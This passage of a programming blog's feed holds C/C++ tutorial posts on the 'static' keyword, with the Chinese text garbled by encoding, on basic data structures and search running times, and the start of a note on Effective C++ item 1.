&lt;p>staticæååééè¦å¨&lt;strong>ç±»å®ä¹ä½å¤&lt;/strong>è¿è¡åå§åä¸å®ä¹ï¼å ä¸ºstaticæ°æ®æåç¬ç«è¯¥ç±»çä»»æå¯¹è±¡å­å¨ï¼&lt;strong>å®æ¯ä¸ç±»å³èçå¯¹è±¡ï¼ä¸ä¸ç±»å¯¹è±¡å³è&lt;/strong>ãä¾å¦ï¼ä¸è¿°ç¨åºä¸­çcåéçåå§åã&lt;/p>
&lt;ul>
&lt;li>&lt;code>åªè½å¨ç±»å¤åå§å&lt;/code>&lt;/li>
&lt;li>ä¸è½éè¿åå§ååè¡¨åå§åï¼&lt;/li>
&lt;li>ä¸è½å¨ç±»åè¿è¡åå§åï¼&lt;/li>
&lt;li>ä¸è½å¨æé å½æ°ä¸­åå§åï¼&lt;/li>
&lt;/ul>
&lt;h4 id="å¸¸é">å¸¸é&lt;/h4>
&lt;p>&lt;code>const int m_c;&lt;/code>&lt;/p>
&lt;ul>
&lt;li>&lt;code>åªè½éè¿åå§ååè¡¨åå§å&lt;/code>&lt;/li>
&lt;li>ä¸è½å¨ç±»åè¿è¡åå§å&lt;/li>
&lt;li>ä¸è½å¨æé å½æ°ä¸­åå§å&lt;/li>
&lt;li>ä¸è½å¨ç±»å¤åå§å&lt;/li>
&lt;/ul>
&lt;h4 id="å¼ç¨åé">å¼ç¨åé&lt;/h4>
&lt;p>&lt;code>int &amp;amp;m_ra;&lt;/code>&lt;/p>
&lt;p>åªè½éè¿åå§ååè¡¨åå§åä¸å¿é¡»ç¨åéåå§åï¼ä¸è½å¨ç±»çå®ä¹å¤ï¼åï¼åå§åï¼ä¸è½éè¿æé å½æ°åå§åã&lt;/p>
&lt;h4 id="éææ´åå¸¸é">éææ´åå¸¸é&lt;/h4>
&lt;p>&lt;code>static const int m_d;&lt;/code>&lt;/p>
&lt;ul>
&lt;li>ï¼æ´åï¼è½å¦å¨ç±»ä¸­åå§åï¼åå³äºç¼è¯å¨&lt;/li>
&lt;li>è½å¨å¨ç±»å¤åå§åï¼ä¸è½å¸¦static&lt;/li>
&lt;/ul>
&lt;h4 id="éæéæ´åå¸¸é">éæéæ´åå¸¸é&lt;/h4>
&lt;p>&lt;code>static const double m_e;&lt;/code>&lt;/p>
&lt;ul>
&lt;li>(doubleåï¼è½å¦å¨ç±»ä¸­åå§åï¼åå³äºç¼è¯å¨&lt;/li>
&lt;li>è½å¨å¨ç±»å¤åå§åï¼ä¸è½å¸¦static&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>éææ´åå¸¸éåéæéæ´å½¢å¸¸éå¨ç±»å®ä¹åé¨åå§åæ¶ï¼å¨VC6.0ä¸­é½ä¸è½ç¼è¯éè¿ï¼èå¨GCCä¸­é½å¯ä»¥ç¼è¯éè¿ï¼å¨ä¸åç¼è¯å¨ä¸æä¸åçç»æï¼ä½åä¸ä¸ªæ¯ç¡®å®çãå½ç¶ï¼å¦æä¸ä¹ æ¯ç±»ååå§åï¼å¯ä»¥å°éæå¸¸éåéæåéçåå§åç»ä¸èµ·æ¥ï¼å°éæå¸¸éåéæåéçåå§åå¨é¨é½ç§»å¨ç±»å®ä¹ä¹å¤åå§åï¼æ¨èä½¿ç¨è¿ç§æ¹å¼ï¼ãå¦å¤ï¼å¦æç¼è¯å¨ä¸æ¯æç±»ååå§åï¼èæ­¤æ¶ç±»å¨ç¼è¯æåæ°æ°éè¦å®ä¹çæåå¸¸éçå¼ï¼èº«åºå¦æ­¤å·¦å³ä¸ºé¾çå¢å°ï¼æä»¬åºè¯¥èèä½¿ç¨enumï¼å ä¸ºenumæ¬è´¨ä¹æ¯ä¸ä¸ªæ´åå¸¸éã&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;h3 id="å°ç»">å°ç»&lt;/h3>
&lt;p>ç±»çéææåå±äºç±»ä½ç¨åï¼ä½ä¸å±äºç±»å¯¹è±¡ï¼å®ççå½å¨æåæ®éçå¨å±éæåéä¸æ ·ï¼ç¨åºè¿è¡æ¶è¿è¡åéåå­ååå§åï¼ç¨åºç»ææ¶åè¢«éæ¾ãæä»¥ä¸è½å¨ç±»çæé å½æ°ä¸­è¿è¡åå§åã&lt;/p>
&lt;p>&lt;strong>ä¼ç¹&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>staticæåçåå­æ¯å¨ç±»çä½ç¨åä¸­ï¼å æ­¤å¯ä»¥&lt;strong>é¿åä¸å¶å®ç±»æåæå¨å±å¯¹è±¡åå­å²çª&lt;/strong>ã&lt;/li>
&lt;li>å¯ä»¥å®æ½å°è£ï¼&lt;strong>staticæåå¯ä»¥æ¯ç§æçï¼èå¨å±å¯¹è±¡ä¸å¯ä»¥&lt;/strong>ã&lt;/li>
&lt;li>éè¯»ç¨åºå®¹æçåºstaticæåä¸æä¸ªç±»ç¸å³èï¼è¿ç§å¯è§æ§å¯ä»¥&lt;strong>æ¸æ°å°åæ ç¨åºåçæå¾&lt;/strong>ã&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="c-ç±»éé¢çstaticæåå½æ°">C++ ç±»éé¢çStaticæåå½æ°&lt;/h2>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
using namespace std;
class test2
{
public:
test2(int num) : y(num){}
~test2(){}
static void testStaticFun()
{
cout &amp;lt;&amp;lt; &amp;quot;y = &amp;quot; &amp;lt;&amp;lt; y &amp;lt;&amp;lt; endl; //Error:éææåå½æ°ä¸è½è®¿é®ééææå
}
void testFun()
{
cout &amp;lt;&amp;lt; &amp;quot;x = &amp;quot; &amp;lt;&amp;lt; x &amp;lt;&amp;lt; endl;
}
private:
static int x;//éææååéçå¼ç¨æ§è¯´æ
int y;
};
int test2::x = 10;//éææååéçå®ä¹æ§è¯´æ
int main(void)
{
test2 t(100);
t.testFun();
return 0;
}
&lt;/code>&lt;/pre>
&lt;h3 id="å°ç»--æåå½æ°ç¹ç¹">å°ç» -æåå½æ°ç¹ç¹&lt;/h3>
&lt;ul>
&lt;li>å ä¸º&lt;strong>staticæåå½æ°æ²¡æthisæé&lt;/strong>ï¼æä»¥éææåå½æ°ä¸å¯ä»¥è®¿é®ééææåã&lt;/li>
&lt;li>ééææåå½æ°å¯ä»¥è®¿é®éææåã&lt;/li>
&lt;li>éææ°æ®æåä¸ç±»çå¤§å°æ å³ï¼å ä¸ºéææååªæ¯ä½ç¨å¨ç±»çèå´èå·²ã&lt;/li>
&lt;/ul>
&lt;h1 id="è¡¥åcè¯­è¨ä¸­staticå³é®å­">è¡¥åï¼Cè¯­è¨ä¸­Staticå³é®å­&lt;/h1>
&lt;p>Cè¯­è¨ç¨åºå¯ä»¥çæç±ä¸ç³»åå¤é¨å¯¹è±¡ææï¼è¿äºå¤é¨å¯¹è±¡å¯è½æ¯åéæå½æ°ãèåé¨åéæ¯æå®ä¹å¨å½æ°åé¨çå½æ°åæ°ååéãå¤é¨åéå®ä¹å¨å½æ°ä¹å¤ï¼å æ­¤å¯ä»¥å¨è®¸å¤å½æ°ä¸­ä½¿ç¨ãç±äºCè¯­è¨ä¸åè®¸å¨ä¸ä¸ªå½æ°ä¸­å®ä¹å¶å®å½æ°ï¼å æ­¤å½æ°æ¬èº«åªè½æ¯âå¤é¨çâã&lt;br>
ç±äºCè¯­è¨ä»£ç æ¯ä»¥æä»¶ä¸ºåä½æ¥ç»ç»çï¼å¨ä¸ä¸ªæºç¨åºæææºæä»¶ä¸­ï¼ä¸ä¸ªå¤é¨åéæå½æ°åªè½å¨æä¸ªæä»¶ä¸­å®ä¹ä¸æ¬¡ï¼èå¶å®æä»¶å¯ä»¥éè¿externå£°ææ¥è®¿é®å®ï¼å®ä¹å¤é¨åéæå½æ°çæºæä»¶ä¸­ä¹å¯ä»¥åå«å¯¹è¯¥å¤é¨åéçexternå£°æï¼ã&lt;br>
èstaticåå¯ä»¥éå®åéæå½æ°ä¸ºéæå­å¨ãå¦æç¨staticéå®å¤é¨åéä¸å½æ°ï¼åå¯ä»¥å°è¯¥å¯¹è±¡çä½ç¨åéå®ä¸ºè¢«ç¼è¯æºæä»¶çå©ä½é¨åãéè¿staticéå®å¤é¨å¯¹è±¡ï¼å¯ä»¥è¾¾å°éèå¤é¨å¯¹è±¡çç®çãå èï¼staticéå®çåéæå½æ°ä¸ä¼ååä¸ç¨åºä¸­å¶å®æä»¶ä¸­ååçç¸å²çªãå¦æç¨staticéå®åé¨åéï¼åè¯¥åéä»ç¨åºä¸å¼å§å°±æ¥æåå­ï¼ä¸ä¼éå¶æå¨å½æ°çè°ç¨åéåºèåéåæ¶å¤±ã&lt;/p>
&lt;h3 id="cè¯­è¨ä¸­ä½¿ç¨éæå½æ°çå¥½å¤">Cè¯­è¨ä¸­ä½¿ç¨éæå½æ°çå¥½å¤&lt;/h3>
&lt;p>éæå½æ°ä¼è¢«èªå¨åéå¨ä¸ä¸ªä¸ç´ä½¿ç¨çå­å¨åºï¼ç´å°éåºåºç¨ç¨åºå®ä¾ï¼é¿åäºè°ç¨å½æ°æ¶åæ åºæ ï¼éåº¦å¿«å¾å¤ã&lt;/p>
&lt;p>å³é®å­âstaticâï¼è¯æä¸­æå°±æ¯âéæçâï¼æä»¥åé¨å½æ°åç§°éæå½æ°ãä½æ­¤å¤âstaticâçå«ä¹ä¸æ¯æå­å¨æ¹å¼ï¼èæ¯æå¯¹å½æ°çä½ç¨åä»å±éäºæ¬æä»¶ã ä½¿ç¨åé¨å½æ°çå¥½å¤æ¯ï¼ä¸åçäººç¼åä¸åçå½æ°æ¶ï¼ä¸ç¨æå¿èªå·±å®ä¹çå½æ°ï¼æ¯å¦ä¼ä¸å¶å®æä»¶ä¸­çå½æ°ååï¼å ä¸ºååä¹æ²¡æå³ç³»ã&lt;/p>
&lt;p>&lt;strong>cè¯­è¨ä¸­staticçè¯­ä¹&lt;/strong>
1.staticåé:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å±é¨&lt;br>
éæå±é¨åéå¨å½æ°åå®ä¹,çå­æä¸ºæ´ä¸ªæºç¨åºï¼ä½ä½ç¨åä¸èªå¨åéç¸åï¼åªè½å¨å®ä¹è¯¥åéçå½æ°åä½¿ç¨ãéåºè¯¥å½æ°åï¼ å°½ç®¡è¯¥åéè¿ç»§ç»­å­å¨ï¼ä½ä¸è½ä½¿ç¨å®ã å¯¹åºæ¬ç±»åçéæå±é¨åéè¥å¨è¯´ææ¶æªèµä»¥åå¼ï¼åç³»ç»èªå¨èµäº0å¼ãèå¯¹èªå¨åéä¸èµåå¼ï¼åå¶å¼æ¯ä¸å®çã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¨å±&lt;br>
å¨å±åéæ¬èº«å°±æ¯éæå­å¨æ¹å¼ï¼ éæå¨å±åéå½ç¶ä¹æ¯éæå­å¨æ¹å¼ãä½æ¯ä»ä»¬çä½ç¨åï¼ééæå¨å± åéçä½ç¨åæ¯æ´ä¸ªæºç¨åºï¼å¤ä¸ªæºæä»¶å¯ä»¥å±åä½¿ç¨ï¼ï¼ èéæå¨å±åéåéå¶äºå¶ä½ç¨åï¼ å³åªå¨å®ä¹è¯¥åéçæºæä»¶åææï¼ å¨åä¸æºç¨åºçå¶å®æºæä»¶ä¸­ä¸è½ä½¿ç¨å®ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>2.staticå½æ°ï¼ä¹å«åé¨å½æ°ï¼&lt;/p>
&lt;ul>
&lt;li>åªè½è¢«æ¬æä»¶ä¸­çå½æ°è°ç¨ï¼èä¸è½è¢«åä¸ç¨åºå¶å®æä»¶ä¸­çå½æ°è°ç¨ãåºå«äºä¸è¬çééæå½æ°ï¼å¤é¨å½æ°ï¼&lt;/li>
&lt;li>staticå¨céé¢å¯ä»¥ç¨æ¥ä¿®é¥°åéï¼ä¹å¯ä»¥ç¨æ¥ä¿®é¥°å½æ°ã&lt;/li>
&lt;li>åçç¨æ¥ä¿®é¥°åéçæ¶åãåéå¨céé¢å¯åä¸ºå­å¨å¨å±æ°æ®åºãæ åå éãå¶å®æä»¬å¹³æ¶æè¯´çå æ æ¯æ èä¸åå«å¯¹ï¼ä¸è¦å¼æ··ã&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-c">int a ;
main()
{
int b ;
int c* = (int *)malloc(sizeof(int));
}
&lt;/code>&lt;/pre>
&lt;p>aæ¯å¨å±åéï¼bæ¯æ åéï¼cæ¯å åéã&lt;/p>
&lt;ul>
&lt;li>
&lt;p>staticå¯¹å¨å±åéçä¿®é¥°ï¼å¯ä»¥è®¤ä¸ºæ¯éå¶äºåªè½æ¯æ¬æä»¶å¼ç¨æ­¤åéãæçç¨åºæ¯ç±å¥½å¤.cæä»¶ææãå½¼æ­¤å¯ä»¥äºç¸å¼ç¨åéï¼ä½å å¥staticä¿®é¥°ä¹åï¼åªè½è¢«æ¬æä»¶ä¸­å½æ°å¼ç¨æ­¤åéã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>staticå¯¹æ åéçä¿®é¥°ï¼å¯ä»¥è®¤ä¸ºæ åéççå½å¨æå»¶é¿å°ç¨åºæ§è¡ç»ææ¶ãä¸è¬æ¥è¯´ï¼æ åéççå½å¨æç±OSç®¡çï¼å¨éæ çè¿ç¨ä¸­ï¼æ åéççå½ä¹å°±ç»æäºãä½å å¥staticä¿®é¥°ä¹åï¼åéå·²ç»ä¸å¨å­å¨å¨æ ä¸­ï¼èæ¯åå¨å±åéä¸èµ·å­å¨ãåæ¶ï¼ç¦»å¼å®ä¹å®çå½æ°åä¸è½ä½¿ç¨ï¼ä½å¦åæ¬¡è°ç¨å®ä¹å®çå½æ°æ¶ï¼å®åå¯ç»§ç»­ä½¿ç¨ï¼ èä¸ä¿å­äºåæ¬¡è¢«è°ç¨åçä¸çå¼ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>staticå¯¹å½æ°çä¿®é¥°ä¸å¯¹å¨å±åéçä¿®é¥°ç¸ä¼¼ï¼åªè½è¢«æ¬æä»¶ä¸­çå½æ°è°ç¨ï¼èä¸è½è¢«åä¸ç¨åºå¶å®æä»¶ä¸­çå½æ°è°ç¨ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="å°ç»-1">å°ç»&lt;/h3>
&lt;p>static å£°æçåéå¨Cè¯­è¨ä¸­æä¸¤æ¹é¢çç¹å¾ï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>åéä¼è¢«æ¾å¨ç¨åºçå¨å±å­å¨åºä¸­ï¼è¿æ ·å¯ä»¥å¨ä¸ä¸æ¬¡è°ç¨çæ¶åè¿å¯ä»¥ä¿æåæ¥çèµå¼ãè¿ä¸ç¹æ¯å®ä¸å æ åéåå åéçåºå«ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åéç¨staticåç¥ç¼è¯å¨ï¼èªå·±ä»ä»å¨åéçä½ç¨èå´åå¯è§ãè¿ä¸ç¹æ¯å®ä¸å¨å±åéçåºå«ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ä¾å­">ä¾å­&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>[æ­£ç¡®] è¥å¨å±åéä»å¨åä¸ªCæä»¶ä¸­è®¿é®ï¼åå¯ä»¥å°è¿ä¸ªåéä¿®æ¹ä¸ºéæå¨å±åéï¼ä»¥éä½æ¨¡åé´çè¦ååº¦ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[æ­£ç¡®] è¥å¨å±åéä»ç±åä¸ªå½æ°è®¿é®ï¼åå¯ä»¥å°è¿ä¸ªåéæ¹ä¸ºè¯¥å½æ°çéæå±é¨åéï¼ä»¥éä½æ¨¡åé´çè¦ååº¦ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[æ­£ç¡®] è®¾è®¡åä½¿ç¨è®¿é®å¨æå¨å±åéãéæå¨å±åéãéæå±é¨åéçå½æ°æ¶ï¼éè¦èèéå¥é®é¢ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[éè¯¯] éæå¨å±åéè¿å¤§ï¼å¯é£ä¼å¯¼è´å æ æº¢åºã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-c">unsigned int sum_int( unsigned int base )
{
ãunsigned int index;
ãstatic unsigned int sum = 0; // æ³¨æï¼æ¯staticç±»åçã
ãfor (index = 1; index &amp;lt;= base; index++)
ã{
ããsum += index;
ã}
ãreturn sum;
}
&lt;/code>&lt;/pre>
&lt;p>æè°çå½æ°æ¯å¯éå¥çï¼ä¹å¯ä»¥è¯´æ¯å¯é¢æµçï¼ï¼å³ï¼åªè¦è¾å¥æ°æ®ç¸åå°±åºäº§çç¸åçè¾åºã&lt;/p>
&lt;p>è¿ä¸ªå½æ°ä¹æä»¥æ¯ä¸å¯é¢æµçï¼å°±æ¯å ä¸ºå½æ°ä¸­ä½¿ç¨äºstaticåéï¼å ä¸ºstaticåéçç¹å¾ï¼è¿æ ·çå½æ°è¢«ç§°ä¸ºï¼å¸¦âåé¨å­å¨å¨âåè½ççå½æ°ãå æ­¤å¦ææä»¬éè¦ä¸ä¸ªå¯éå¥çå½æ°ï¼é£ä¹ï¼æä»¬ä¸å®è¦é¿åå½æ°ä¸­ä½¿ç¨staticåéï¼è¿ç§å½æ°ä¸­çstaticåéï¼ä½¿ç¨ååæ¯ï¼è½ä¸ç¨å°½éä¸ç¨ã&lt;/p>
&lt;p>å°ä¸é¢çå½æ°ä¿®æ¹ä¸ºå¯éå¥çå½æ°å¾ç®åï¼åªè¦å°å£°æsumåéä¸­çstaticå³é®å­å»æï¼åésumå³åä¸ºä¸ä¸ªauto ç±»åçåéï¼å½æ°å³åä¸ºä¸ä¸ªå¯éå¥çå½æ°ã&lt;/p>
&lt;p>å½ç¶ï¼æäºæ¶åï¼å¨å½æ°ä¸­æ¯å¿é¡»è¦ä½¿ç¨staticåéçï¼æ¯å¦å½æå½æ°çè¿åå¼ä¸ºæéç±»åæ¶ï¼åå¿é¡»æ¯staticçå±é¨åéçå°åä½ä¸ºè¿åå¼ï¼è¥ä¸ºautoç±»åï¼åè¿åä¸ºéæéã&lt;/p>
&lt;blockquote>
&lt;p>å¨å±åéä»¥åå¨å±åéä¸éæåéçå³ç³»ï¼
é¡¾åæä¹ï¼å¨å±åéæ¯æè½å¤å¨å¨å±å¼ç¨çåéï¼ç¸å¯¹äºå±é¨åéçæ¦å¿µï¼ä¹å«å¤é¨åéï¼åéæåéä¸æ ·ï¼å¨å±åéä½äºéææ°æ®åºï¼å¨å±åéä¸å¤å®ä¹ï¼å¤å¤å¼ç¨ï¼ç¨å³é®å­âexternâå¼ç¨âå¤é¨âçåéã
å¨å±åéä¹å¯ä»¥æ¯éæçï¼å¨åé¢æè¿è¯´æï¼éæå¨å±åéçæä¹å°±æ¯ä¸è®©âå¤é¨âå¼ç¨ï¼æ¯åä¸ªæºæä»¶éçå¨å±åéï¼å³æ¯ç¼è¯é¶æ®µçå¨å±åéï¼èä¸æ¯è¿æ¥é¶æ®µçå¨å±åéã&lt;/p>
&lt;/blockquote>
&lt;h3 id="code">Code&lt;/h3>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
using namespace std;
class TestStatic
{
public:
TestStatic() : y(1), r(y), d(3),private_y(4){++c;} //å¯¹äºå¸¸éåæååéåå¼ç¨åæååéï¼å¿é¡»éè¿åæ°ååè¡¨çæ¹å¼è¿è¡åå§åã
~TestStatic(){}
int y; //æ®éåéæå
int &amp;amp;r; //å¼ç¨æååé
const int d; //å¸¸éæååé
static int c; //éææååé
static const int x; //éæå¸¸éæ´åæååé
static void testStaticFunErr() {
std::cout &amp;lt;&amp;lt; std::endl;
}
static void testStaticFun() {
std::cout &amp;lt;&amp;lt; &amp;quot;Call Static Function: &amp;quot; &amp;lt;&amp;lt; xx &amp;lt;&amp;lt; std::endl;
}
private:
int private_y;
static const int xx; //éæå¸¸éæ´åæååéå£°æ
static const double z; //éæå¸¸ééæ´åæååéå£°æ
static const float zz; //éæå¸¸ééæ´åæååé
};
const int TestStatic::xx = 4; //éæå¸¸éæ´åæååéå®ä¹
const double TestStatic::z = 5.1; ////éæå¸¸ééæ´åæååéå®ä¹
int TestStatic::c = 2;
// int TestStatic::x;
const int TestStatic::x = 5;
int main(void)
{
TestStatic a, b, c;
std::cout &amp;lt;&amp;lt; &amp;quot;Class Static variable x:&amp;quot; &amp;lt;&amp;lt; TestStatic::x &amp;lt;&amp;lt; std::endl;
std::cout &amp;lt;&amp;lt; &amp;quot;Class Static variable c:&amp;quot; &amp;lt;&amp;lt; TestStatic::c &amp;lt;&amp;lt; std::endl;
return 0;
}
&lt;/code>&lt;/pre></description></item><item><title>Algorithm Introduce1-Basic Data Structure</title><link>http://www.guozet.me/post/CPSC2120-Algorithm-Introduce/</link><pubDate>Tue, 18 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/CPSC2120-Algorithm-Introduce/</guid><description>&lt;h1 id="algorithm-introduce">Algorithm Introduce&lt;/h1>
&lt;p>&lt;strong>What is a good Algorithm?&lt;/strong> (Cite from: Brian C. Dean )&lt;/p>
&lt;ul>
&lt;li>Always terminates and produces &lt;strong>correct&lt;/strong> output.&lt;/li>
&lt;li>Make &lt;strong>efficient&lt;/strong> use of computational resources.
Minimizes running time, memory usage, processors, bandwidth, power consumed, heat produced.&lt;/li>
&lt;li>Is &lt;strong>simple&lt;/strong> to describe, understand, analyze, implement, and debug&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>For example:&lt;/strong>
Linear search:&lt;/p>
&lt;pre>&lt;code class="language-cpp">for (int i = 0; i&amp;lt;N; i++) {
if (target == A[i]) {found it!}
}
&lt;/code>&lt;/pre>
&lt;p>Binary search:&lt;/p>
&lt;pre>&lt;code class="language-cpp">low = 0; high = N-1;
while (low &amp;lt;= high) {
mid = (low + high) / 2;
if (target == A[mid]) { found it! }
if (target &amp;gt; A[mid]) low = mid+1;
else high = mid-1;
}
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>Linear search: O(N) time.
Binary search: O(log N) time.&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;h2 id="running-time">Running time&lt;/h2>
&lt;p>What is the &lt;code>Linear search: O(N) time.&lt;/code> meaning in the above? We usually use &lt;code>asymptotic notation&lt;/code> to describe how running time scales with input size.&lt;/p>
&lt;blockquote>
&lt;p>O(f(N)) means âupper-bounded by a constant times f(N) as N grows largeâ. Just like, if the input of size is N, then the take about nN machine instructions, then we can say it runs in O(N) time.&lt;/p>
&lt;/blockquote>
&lt;p>There are other two symbol which are used for discribe the running time scales with input size.&lt;/p>
&lt;ul>
&lt;li>Î©() provides an asymptotic lower bound.&lt;/li>
&lt;li>Î() means both a lower and upper bound.&lt;/li>
&lt;/ul>
&lt;h3 id="arrays-listed-lists">Arrays, Listed lists&lt;/h3>
&lt;h4 id="arrays">Arrays&lt;/h4>
&lt;p>After you define the size of the arrays, you can change the size of the array at the running time. You just can allocate for a new arrays at the running time and copy the old one to the new one.&lt;/p>
&lt;pre>&lt;code class="language-cpp">/* Statically defined (size known at compile time) */
int A[100];
int B[100] = {1, 2, 3};
/* Dynamically allocated at run time */
int *C = (int *)malloc(100 * sizeof(int));
int *D = new int[100];
/* A[], C[], and D[] filled with garbage until initialized */
/* Remember pointers can be used as arrays -- e.g., C[7] */
/* Donât forget to free memory for C and D... */
free (C);
delete [] D;
&lt;/code>&lt;/pre>
&lt;p>Analyze:&lt;/p>
&lt;ul>
&lt;li>Retrieve or modify any element in O(1) time.&lt;/li>
&lt;li>Insert or delete in middle of list: O(N) time.&lt;/li>
&lt;li>Insert or delete from ends: O(1) time&lt;/li>
&lt;/ul>
&lt;h4 id="linked-lists">Linked Lists&lt;/h4>
&lt;pre>&lt;code class="language-cpp">/* In C, typically
use âtypedef struct...â */
struct Node {
int payload;
Node *next;
}
int list_length(Node *n)
{
int count = 0;
while (n != NULL) {
count++;
n = n-&amp;gt;next;
}
return count;
}
&lt;/code>&lt;/pre>
&lt;p>TODO:&lt;/p>
&lt;ul>
&lt;li>&lt;input disabled="" type="checkbox"> Task1:Write the doubly linked lists.&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> Write a list which maintain a pointer to the first and last element.&lt;/li>
&lt;/ul>
&lt;p>Analyze:&lt;/p>
&lt;ul>
&lt;li>Seek to any position in list: O(N) time.&lt;/li>
&lt;li>Then insert or delete element: O(1) time.&lt;/li>
&lt;li>Insert or delete from ends: O(1) time.&lt;/li>
&lt;/ul>
&lt;h4 id="circular-arrays-queues">Circular Arrays, Queues&lt;/h4>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-18-CPSC2120-Algorithm-Introduce/2018-09-19-10-05-38.png" alt="">&lt;/p>
&lt;pre>&lt;code class="language-cpp">void enqueue(int x)
{
A[front] = x;
front = (front+1) % N;
}
int dequeue(void)
{
int result = A[back];
back = (back+1) % N;
return result;
}
&lt;/code>&lt;/pre>
&lt;h4 id="stacks">Stacks&lt;/h4>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-18-CPSC2120-Algorithm-Introduce/2018-09-19-10-07-33.png" alt="">&lt;/p>
&lt;pre>&lt;code class="language-cpp">void push(int x)
{
A[top++] = x;
}
int pop(void)
{
return A[--top];
}
void what_does_this_do(int n)
{
if (n==0) return;
printf (â%d\nâ, n);
what_does_this_do(n-1);
printf (â%d\nâ, n);
}
&lt;/code>&lt;/pre>
&lt;h3 id="arrays-vs-lists-example">Arrays Vs Lists Example&lt;/h3>
&lt;p>We can use a example(From Brian. Dean) to introduce the running time abou the Arrays and Lists.&lt;/p>
&lt;p>In the file &lt;code>studens.txt&lt;/code> have a lot of students information about their name. Like this follow:&lt;/p>
&lt;pre>&lt;code>Sebastian Valentin
Jeffrey Wang
Jacob William
***
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>Question:&lt;/strong>&lt;/p>
&lt;p>Write for me a program in C++ that takes as input a list of names, and prints out each name that appears in the list multiple times.&lt;/p>
&lt;p>&lt;strong>Arrays Solution:&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
using namespace std;
string *name;
int N; // how many elements we've actually read from the file
int allocated; // how much memory we've allocated
int num_occurences(string s)
{
int count = 0;
for (int i=0; i&amp;lt;N; i++) if (name[i] == s) count++;
return count;
}
int main (void)
{
string fname, lname;
ifstream fin(&amp;quot;students.txt&amp;quot;);
name = new string[4];
allocated = 4; // start with array of size 4
// (this is somewhat arbitrary; any small constant would be fine)
while (fin &amp;gt;&amp;gt; fname &amp;gt;&amp;gt; lname) {
if (num_occurences(fname) == 1) // O(n) time
cout &amp;lt;&amp;lt; fname &amp;lt;&amp;lt; &amp;quot;\n&amp;quot;;
// Check if we need to transfer our array into a new larger array
if (N == allocated) {
string *newarray = new string[allocated * 2];
for (int i=0; i&amp;lt;N; i++) newarray[i] = name[i];
delete [] name; // old array not needed any more; free it...
name = newarray;
allocated = allocated * 2;
// now name points to the new array, which is twice as big and
// contains all the N elements we've read so far...
}
name[N++] = fname;
}
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>List Solution&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
using namespace std;
struct Node {
string name;
Node *next;
Node (string s, Node *n) { name = s; next = n; }
};
int num_occurences(Node *head, string s)
{
int count = 0;
Node *n = head;
while (n != NULL) {
if (n-&amp;gt;name == s) count++;
n = n-&amp;gt;next;
}
return count;
}
int main (void)
{
string fname, lname;
ifstream fin(&amp;quot;students.txt&amp;quot;);
Node *head = NULL;
while (fin &amp;gt;&amp;gt; fname &amp;gt;&amp;gt; lname) {
if (num_occurences(head, fname) == 1) // O(n)
cout &amp;lt;&amp;lt; fname &amp;lt;&amp;lt; &amp;quot;\n&amp;quot;;
head = new Node(fname, head);
}
return 0;
}
&lt;/code>&lt;/pre></description></item><item><title>Book. Effective C++ item1-View C++ as a federatime of languages</title><link>http://www.guozet.me/post/EffectiveC++-item1/</link><pubDate>Tue, 11 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/EffectiveC++-item1/</guid><description>&lt;h1 id="view-c-as-a-federation-of-languages">View C++ as a federation of Languages&lt;/h1>
&lt;p>In the begining, C++ was just C with some object-oriented features tacked on. &lt;code>c++ = C with classes&lt;/code>. ä½æ¯å°äºåæ¥ï¼C++å°±åå«äºå¾å¤å¤æçäºç©ï¼æä»¬å¨ä½¿ç¨C++çæ¶åå¯ä»¥å°å¶çæåç§ä¸åçä½¿ç¨æ¹å¼ã&lt;/p>
&lt;ul>
&lt;li>Cè¯­è¨ã æç§Cè¯­è¨çè§åå»ä½¿ç¨ï¼æ²¡ææ¨¡æ¿ï¼æ²¡æå¼å¸¸ï¼æ²¡æéè½½&lt;/li>
&lt;li>Object-Oriented C+ãè¿ä¸é¨åæ¯C with CLassesæè¿½æ±çï¼classes, encapsulation, inheritance, polymorphism, virtualãæç§é¢åå¯¹è±¡çè®¾è®¡ååå»åå°±å¥½äº&lt;/li>
&lt;li>Template C++. æ³åç¼ç¨&lt;/li>
&lt;li>STLãSTLæ¯ä¸ä¸ªtemplateç¨åºåºï¼å¯¹containers, iterators, algorithms å Function objectsè¿è¡äºéå¶ãå¦æå¨ç¼ç¨ä¸­ä½¿ç¨äºSTL, é£å°±å¿é¡»éµå®STLçè§å&lt;/li>
&lt;/ul>
